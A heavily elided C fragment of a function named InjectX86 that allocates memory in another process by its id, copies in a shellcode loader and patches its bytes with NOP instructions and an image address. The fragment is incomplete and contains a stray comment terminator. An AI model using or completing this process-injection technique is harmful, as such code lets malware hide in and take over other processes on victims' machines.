...
NTSTATUS InjectX86(HANDLE pid, char *shellcode, SIZE_T shellcodeSize)
{
	...
	do
	{
		...
		uShellcode = AllocateMemory(pid, sizeof(MemLoadShellcode_x86));
		...
		memcpy(uShellcode, MemLoadShellcode_x86, sizeof(MemLoadShellcode_x86));
		...
		*(PULONG64)&uShellcode[0x512] = (ULONG64)uImage;*/
		...
		{
			uShellcode[0x337 + i] = 0x90;
		}
		uShellcode[0x345] = 0xb8;
		*(PINT32)&uShellcode[0x346] = (INT32)uImage;
